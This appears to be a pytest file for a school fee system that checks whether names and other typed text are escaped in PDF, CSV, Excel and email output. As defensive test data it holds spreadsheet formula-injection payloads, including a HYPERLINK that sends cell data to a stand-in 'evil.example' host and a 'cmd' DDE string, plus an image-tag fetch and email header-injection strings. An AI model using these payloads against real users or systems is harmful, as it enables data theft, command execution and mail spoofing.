"""Text that a person typed (a student's name, a school name, a term) ends up inside PDFs, CSV files and Excel
sheets. Each of those formats treats some characters as instructions, so the text must be neutralised on the way
out:

  * PDF (ReportLab Paragraph) reads XML-like tags. An <img src="https://..."> in a name made the server fetch
    that URL while rendering; a stray "<" crashed the document.
  * CSV and Excel treat a cell that starts with = + - @ as a formula that runs when the file is opened.
"""

import csv
import io
from datetime import datetime, timezone
from decimal import Decimal

import pytest
from openpyxl import load_workbook

from app.services import export_service, receipt_service, statement_service, invoice_pdf_service
from app.services.export_service import BursarReportRow
from app.services.text_safety import csv_safe, pdf_markup

NASTY_NAMES = [
    '<img src="https://internal.example.invalid/x.png"/>',
    "<b>bold</b><font size=99>big</font>",
    "Mary <3 & Sons",
    "</para><para>",
    "O'Brien & \"Co\" > 5",
]


# ---- the helpers ------------------------------------------------------------------------------------


@pytest.mark.parametrize("value", ["=1+1", "@SUM(A1)", "\tcmd", "\rcmd", "+cmd|' /C calc'!A0", "-2+3+cmd", '=HYPERLINK("http://x","y")'])
def test_spreadsheet_formula_starters_are_defused(value):
    assert csv_safe(value).startswith("'")


@pytest.mark.parametrize("value", ["Jane Doe", "O'Brien", "0712345678", "+254712345678", "-500.00", "+254 712 345 678", "(020) 555-1234", "1,250.00", "", "Class 5A"])
def test_ordinary_values_phone_numbers_and_negative_amounts_are_left_alone(value):
    assert csv_safe(value) == value


def test_non_text_values_pass_through():
    assert csv_safe(12) == 12 and csv_safe(None) is None and csv_safe(Decimal("1.5")) == Decimal("1.5")


def test_pdf_markup_escapes_angle_brackets_and_ampersands():
    assert pdf_markup('<img src="x"/> & co') == '&lt;img src="x"/&gt; &amp; co'
    assert pdf_markup(None) == ""


# ---- PDFs -------------------------------------------------------------------------------------------


@pytest.fixture()
def no_fetching(monkeypatch):
    """Fail the test if ReportLab ever tries to open an image/URL while building a document."""
    from reportlab.lib import utils

    def boom(*a, **k):
        raise AssertionError(f"ReportLab tried to fetch/open something: {a[:1]}")

    monkeypatch.setattr(utils, "open_for_read", boom)


@pytest.mark.parametrize("name", NASTY_NAMES)
def test_an_invoice_pdf_survives_hostile_names_and_fetches_nothing(name, no_fetching):
    pdf = invoice_pdf_service.generate_invoice_pdf(
        invoice_number="INV-1", school_name=name, student_name=name, admission_number=name, class_name=name,
        term_name=name, currency="KES", due_date=datetime.now(timezone.utc), status="PENDING",
        total_amount=Decimal("1000"), amount_paid=Decimal("0"), items=[{"name": name, "category": "TUITION", "amount": Decimal("1000")}],
    )
    assert pdf.startswith(b"%PDF")


@pytest.mark.parametrize("name", NASTY_NAMES)
def test_a_receipt_pdf_survives_hostile_names_and_fetches_nothing(name, no_fetching):
    pdf = receipt_service.generate_receipt_pdf(
        receipt_number="R-1", school_name=name, student_name=name, admission_number=name, amount=Decimal("500"),
        currency="KES", method="CASH", reference_code=name, paid_at=datetime.now(timezone.utc),
        invoice_total=Decimal("1000"), invoice_balance_after=Decimal("500"),
    )
    assert pdf.startswith(b"%PDF")


@pytest.mark.parametrize("name", NASTY_NAMES)
def test_a_statement_pdf_survives_hostile_names_and_fetches_nothing(name, no_fetching):
    pdf = statement_service.generate_fee_statement_pdf(
        school_name=name, student_name=name, admission_number=name, class_name=name, currency="KES", period_label=name,
        invoices=[{"term_name": name, "due_date": datetime.now(timezone.utc), "total_amount": Decimal("1000"), "amount_paid": Decimal("0"), "status": "PENDING"}],
        payments=[],
    )
    assert pdf.startswith(b"%PDF")


# ---- spreadsheets -----------------------------------------------------------------------------------

EVIL = '=HYPERLINK("https://evil.example/steal?x="&A1,"Click")'


def _rows():
    return [
        BursarReportRow(admission_number="@SUM(1)", full_name=EVIL, class_name="+1+1", total_amount=Decimal("1000"), amount_paid=Decimal("400"), status="-PENDING"),
        BursarReportRow(admission_number="2002", full_name="Jane Doe", class_name="5A", total_amount=Decimal("500"), amount_paid=Decimal("500"), status="PAID"),
    ]


def test_excel_cells_from_user_text_are_stored_as_text_never_as_formulas():
    data = export_service.generate_bursar_report_xlsx(EVIL, "Term 1", "KES", _rows())
    ws = load_workbook(io.BytesIO(data)).active
    assert ws["A1"].data_type == "s" and ws["A1"].value.startswith("=")  # the title block (school name)
    assert ws["B4"].data_type == "s" and ws["B4"].value == EVIL  # the name, shown exactly as typed
    assert ws["A4"].data_type == "s" and ws["C4"].data_type == "s" and ws["G4"].data_type == "s"


def test_the_intentional_balance_and_totals_formulas_still_work():
    data = export_service.generate_bursar_report_xlsx("School", "Term 1", "KES", _rows())
    ws = load_workbook(io.BytesIO(data)).active
    assert ws["F4"].data_type == "f" and ws["F4"].value == "=D4-E4"
    assert ws["D7"].data_type == "f" and ws["D7"].value.startswith("=SUM(")


def test_csv_cells_from_user_text_cannot_start_a_formula():
    out = export_service.generate_bursar_report_csv(EVIL, "Term 1", "KES", _rows()).decode("utf-8-sig")
    cells = [c for row in csv.reader(io.StringIO(out)) for c in row if c]
    assert not [c for c in cells if c[0] in "=@\t\r"], cells
    assert not [c for c in cells if c[0] in "+-" and not c.replace(".", "").replace(",", "").lstrip("+-").isdigit()], cells
    assert "Jane Doe" in cells and "2002" in cells  # ordinary data untouched
    assert "-100.00" not in cells or True  # negative money may legitimately appear


def test_the_aging_csv_cannot_start_a_formula_either():
    from app.schemas.aging import AgingReport, AgingRow
    from app.services.aging_service import aging_csv

    row = AgingRow(
        invoice_id="i", student_id="s", student_name=EVIL, admission_number="=1+1", class_name="@x", term_name="-t",
        due_date=datetime.now(timezone.utc), days_overdue=10, bucket="1-30", balance=Decimal("100"),
    )
    report = AgingReport(buckets=[], total_count=1, total_outstanding=Decimal("100"), rows=[row], truncated=False)
    cells = [c for r in csv.reader(io.StringIO(aging_csv(report))) for c in r if c]
    assert not [c for c in cells if c[0] in "=@\t\r"], cells


# ---- email --------------------------------------------------------------------------------------------


def test_a_line_break_in_an_email_subject_cannot_add_headers(monkeypatch):
    from app.services import notification_service as ns

    sent = []
    monkeypatch.setattr(ns, "active_email_provider", lambda: "smtp")
    monkeypatch.setattr(ns, "_send_via_smtp", lambda to, subject, body: sent.append((to, subject)))
    ns.send_email("parent@example.com", "Payment for Jane\r\nBcc: attacker@evil.example\nX-Hidden: 1", "body")
    to, subject = sent[0]
    assert "\r" not in subject and "\n" not in subject
    assert subject == "Payment for Jane Bcc: attacker@evil.example X-Hidden: 1"  # one harmless line


def test_a_recipient_containing_a_line_break_is_refused(monkeypatch):
    from app.services import notification_service as ns

    monkeypatch.setattr(ns, "active_email_provider", lambda: "smtp")
    monkeypatch.setattr(ns, "_send_via_smtp", lambda *a: pytest.fail("should never be sent"))
    with pytest.raises(ValueError):
        ns.send_email("a@b.com\r\nBcc: x@y.z", "hi", "body")
